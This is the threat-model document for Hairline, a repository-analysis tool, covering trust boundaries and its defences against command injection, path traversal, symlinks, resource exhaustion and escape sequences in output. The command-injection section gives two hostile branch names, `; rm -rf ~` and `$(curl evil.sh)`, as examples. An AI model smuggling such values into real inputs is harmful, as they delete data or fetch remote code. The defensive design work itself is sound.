# Threat model

Hairline reads source repositories. **Repository content is untrusted input.**
A repository may be hostile, malformed, or simply enormous, and none of those
may be allowed to turn into code execution, data exfiltration, or an exhausted
process.

---

## Trust boundaries

| Input | Trust | Handling |
|---|---|---|
| Repository source at any revision | **untrusted** | parsed only; never executed |
| `tsconfig.json` in a revision | **untrusted** | a fixed allow-list of options is honoured |
| `package.json` in a revision | **untrusted** | compared for drift; never installed from |
| Branch names, revisions, paths | **untrusted** | passed as argv, never through a shell |
| Installed `node_modules` | semi-trusted | read-only, declaration files only, opt-in |
| TypeScript's own `lib/*.d.ts` | trusted | part of the pinned dependency |
| CLI arguments | trusted (the operator) | validated for usage errors |

---

## What Hairline never does

**Execute repository code.** Analysis is parsing and type checking. No build
script, no `npm install`, no lifecycle hook, no plugin loading, no `eval`, no
dynamic `import()` of repository content. The TypeScript compiler API is used
for its checker only, and emit is disabled unconditionally.

**Write to the repository.** Every git operation addresses the object database
directly: `rev-parse`, `ls-tree`, `cat-file`, `merge-base`, `diff`,
`merge-tree --write-tree`. HEAD never moves, the working tree is never touched,
no commit is created, no branch is modified. `merge-tree` performs trial merges
entirely in the object database.

This is asserted by test — `tests/integration/cli.test.ts` records `HEAD` and
`git status --porcelain` before and after a full analysis and requires both to
be unchanged.

**Talk to the network.** No telemetry, no analytics, no model API, no update
check. The engine has exactly one runtime dependency ([ADR-0003](./decisions.md)),
which is the TypeScript compiler. Source code never leaves the machine.

**Depend on an LLM.** Correctness is deterministic. There is no model in the
pipeline, so there is no prompt injection surface from repository content.

---

## Attack surface and mitigations

### Command injection

Every git invocation uses `execFile` with an explicit argument vector
(`src/git/exec.ts`). No shell is involved, so a branch named
`; rm -rf ~` or `$(curl evil.sh)` is passed to git as a literal ref name and
fails to resolve. `--no-pager` is always passed so git can never spawn one.

### Path traversal

`isSafeRepoPath` rejects absolute paths, any segment equal to `..` or `.`,
empty segments, backslashes, and embedded NUL bytes. A rejected path produces a
`file-skipped` diagnostic rather than being silently dropped.

Hairline reads from git objects and never joins a repository path onto a
filesystem path, so traversal has no target — the check is enforced at the
source anyway, because a future adapter or cache might.

Tested directly in `tests/unit/robustness.test.ts`.

### Reading outside the repository

The compiler host confines disk reads to exactly two roots: TypeScript's own
`lib/` directory, and — only when enabled — one `node_modules`. `diskPathFor`
returns `undefined` for anything else and every disk accessor refuses on
`undefined`.

Source files themselves are served from the snapshot, never from disk. The
synthetic mount point `/__hairline__` is chosen to be a path that cannot exist,
so a bug in path handling surfaces as "file not found" rather than as Hairline
silently reading the developer's working tree — which would mix revisions and
produce findings that cannot be reproduced.

`tests/unit/program-host.test.ts` asserts that every file loaded into a program
is either snapshot content or inside those two roots.

### Symlinks and non-regular entries

`listTree` accepts only modes `100644` and `100755`. Symlinks (`120000`),
gitlinks and submodules (`160000`) are filtered out before any read, so a
symlink pointing at `/etc/shadow` is never followed — its blob is the link
text, and it is not read at all.

### Resource exhaustion

| Limit | Default | Behaviour on breach |
|---|---|---|
| File size | 2 MiB | `file-skipped` diagnostic |
| Total snapshot bytes | 512 MiB | `limit-exceeded`, remaining files not indexed |
| File count | 50,000 | `limit-exceeded`, truncated |
| Alias chain depth | 16 hops | stops; cyclic re-exports cannot loop forever |
| Contract extraction time | 20 s per revision | remaining symbols indexed by identity only, `limit-exceeded` **error** |
| Parent-chain walk | 64 hops | stops |
| Import BFS depth | 8 hops | stops |
| Binary content | NUL in first 8 KiB | treated as binary, skipped |

Excluded by default: `node_modules/`, `.git/`, `dist/`, `build/`, `out/`,
`coverage/`, `.next/`, `vendor/`, `.yarn/`.

Deeply nested syntax is tested directly (400 levels of nesting) and does not
exhaust the stack.

The time budget is an availability control, not just a convenience: rendering a
type can be arbitrarily expensive, and a sufficiently recursive conditional
type will hold the checker on a single declaration indefinitely. A repository
could contain one by accident or on purpose. Exhausting the budget degrades to
identity-only indexing and raises an **error**-severity diagnostic, so the run
reads as incomplete rather than clean.

Every limit produces a diagnostic. A truncated analysis must read as
*incomplete*, never as *clean*.

### Malformed input

A file that fails to parse produces a `parse-failed` diagnostic and is excluded
from the index; the rest of the snapshot still indexes. `getAliasedSymbol`
throws on non-aliases and is wrapped. `typeToString` is wrapped and degrades to
`<unprintable>`. `parseSymbolId` returns `undefined` rather than throwing, so a
malformed id read from a cache or a fixture degrades instead of crashing.

An analyzer that throws is caught, its failure recorded as a diagnostic, and
the findings other analyzers produced are preserved — a crash must not silently
become "nothing found".

### Hostile content in output

Findings quote identifiers, type renderings and literal values from code
Hairline did not write. Without neutralising them, a repository could embed
escape sequences that reposition the cursor, recolour output or erase lines —
letting the code under analysis forge or hide parts of the report about itself.

Every repository-derived string passes through `sanitize` before being
printed: C0 controls, DEL and the C1 range are removed, and tabs become spaces
so alignment survives. Sanitising happens at the output boundary, not in the
model, so the stored contract keeps the real value.

Verified by `tests/unit/output-safety.test.ts`, including the path where it is
actually load-bearing: **member names are not JSON-encoded anywhere in the
model**, so a property name containing an escape reaches member deltas and
rendered symbol ids as a raw control character. Literal *values* are
`JSON.stringify`d and are therefore already safe, and the JSON reporter is
unaffected for the same reason.

---

## Known approximations

**Dependency types come from the working tree, not the revision.**
`node_modules` is gitignored and therefore absent from every revision's tree.
When enabled, Hairline reads the *currently installed* dependencies for all
revisions. If a branch changed `package.json`, its contracts may be computed
against the wrong dependency versions — `run.ts` emits a warning diagnostic
when it detects that drift. Disable with `--no-installed-deps`, at the cost of
degrading every dependency-typed contract to an unresolved import.

**Reading `node_modules` means reading third-party declaration files.** Those
are parsed, not executed, but a `.d.ts` crafted to be pathological could
consume time in the checker. The file-size and total-byte limits do not apply
to the `node_modules` overlay. Opt out with `--no-installed-deps` if the
repository's dependencies are not trusted.

---

## If dynamic validation is added later

Speculatively merging and running the combined test suite is a plausible future
phase, and it crosses the central boundary of this document: it would mean
**executing untrusted repository code**.

It must not be bolted onto the static engine. It requires an explicit isolation
boundary — container or VM, no network by default, no host filesystem access
beyond the checkout, wall-clock and memory limits, and an explicit opt-in per
invocation. The static engine must remain fully usable, and must remain the
default, without it.
